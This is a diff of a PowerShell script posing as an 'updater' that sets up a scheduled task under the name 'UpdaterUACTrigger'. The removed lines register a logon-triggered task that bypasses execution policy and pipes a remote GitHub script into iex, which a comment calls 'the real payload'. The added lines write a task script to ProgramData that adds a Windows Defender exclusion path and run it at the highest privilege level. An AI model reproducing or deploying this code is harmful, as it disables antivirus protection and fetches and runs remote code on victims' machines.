@@ -1,67 +1,64 @@
+# Define log file
 $logPath = "C:\Windows\Temp\updater_log.txt"
-function Write-Log {
-    param ($msg)
-    "[" + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "] $msg" | Out-File $logPath -Append -Encoding utf8
+function Log($msg) {
+    $ts = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
+    $ts | Out-File -FilePath $logPath -Append -Encoding utf8
 }
 
-Write-Log "🔁 Script executed by user: $env:USERNAME"
+Log "➡️ Script started. User: $env:USERNAME, Interactive: $([Environment]::UserInteractive)"
 
-# Check for real interactive session
+# If not running in interactive session (e.g., SYSTEM at boot)
+if (-not ([Environment]::UserInteractive)) {
+    Log "⚠️ Non-interactive session. Creating deferred UAC task..."
+
+    $taskName = "UpdaterUACTrigger"
+    $user = (Get-CimInstance Win32_ComputerSystem).UserName
+    if (-not $user) {
+        Log "⛔ No interactive user found. Aborting."
+        exit
+    }
+
+    # Write inner task script to ProgramData
+    $taskScriptPath = "$env:ProgramData\UpdaterTask.ps1"
+    $taskContent = @"
+Start-Sleep -Seconds 5
 try {
-    $realUser = (query user) -match "Active"
+    Add-MpPreference -ExclusionPath 'C:\Users\Public\TestSafeFolder' -ErrorAction Stop
+    '$([DateTime]::Now): ✅ Exclusion added.' | Out-File 'C:\Windows\Temp\updater_log.txt' -Append
 } catch {
-    $realUser = $false
+    '$([DateTime]::Now): ❌ Error during exclusion: ' + \$_ | Out-File 'C:\Windows\Temp\updater_log.txt' -Append
+    Write-Host "❌ Error: $($_.Exception.Message)"
+    Pause
 }
-
-if (-not $realUser) {
-    Write-Log "❌ No interactive user session found. Exiting..."
-    return
-}
-
-# Remove old task if exists
-$taskName = "UpdaterUACTrigger"
-schtasks /Delete /TN $taskName /F > $null 2>&1
-Write-Log "🧹 Deleted old scheduled task '$taskName' if it existed"
-
-# Define command to run after login (this is the real payload)
-$ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-$scriptCmd = '-ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex"'
-
-# Build full XML for scheduled task (UAC enabled)
-$taskXML = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Author>UpdaterScript</Author></RegistrationInfo>
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-      <Delay>PT1M</Delay>
-    </LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>$ps</Command>
-      <Arguments>$scriptCmd</Arguments>
-    </Exec>
-  </Actions>
-</Task>
+Pause
 "@
+    $taskContent | Out-File -FilePath $taskScriptPath -Encoding utf8
 
-# Write XML file and register task
-$tempXML = "$env:TEMP\updater_task.xml"
-$taskXML | Set-Content -Path $tempXML -Encoding Unicode
-schtasks /Create /TN $taskName /XML $tempXML /F | Out-Null
+    try {
+        # Clean up previous task if exists
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        Log "🧹 Deleted old scheduled task '$taskName' if it existed"
 
-Write-Log "✅ Scheduled task '$taskName' created. It will run 1 minute after user login with UAC prompt."
+        # Create new scheduled task
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$taskScriptPath`""
+        $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
+        $principal = New-ScheduledTaskPrincipal -UserId $user -RunLevel Highest -LogonType Interactive
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal
+
+        Log "✅ Scheduled task '$taskName' created. It will run 1 minute after user login with UAC prompt."
+    } catch {
+        Log "❌ Failed to create scheduled task: $_"
+    }
+
+    exit
+}
+
+# If already in interactive session (for manual test)
+try {
+    Add-MpPreference -ExclusionPath 'C:\Users\Public\TestSafeFolder' -ErrorAction Stop
+    Log "✅ Exclusion added immediately."
+} catch {
+    Log "❌ Immediate exclusion failed: $_"
+    Write-Host "❌ Error: $($_.Exception.Message)"
+    Pause
+}
